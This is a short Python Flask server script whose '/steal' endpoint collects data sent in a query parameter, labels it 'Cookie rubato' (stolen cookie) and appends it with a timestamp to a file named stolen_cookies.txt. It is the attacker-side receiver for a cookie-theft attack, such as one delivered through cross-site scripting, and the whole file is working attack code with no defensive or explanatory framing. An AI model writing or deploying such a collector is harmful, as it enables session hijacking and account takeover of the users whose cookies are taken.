from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie_data = request.args.get('data')
    if cookie_data:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Cookie rubato: {cookie_data}\n"
        print(log_entry, end='')
        with open("stolen_cookies.txt", "a") as f:
            f.write(log_entry)
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)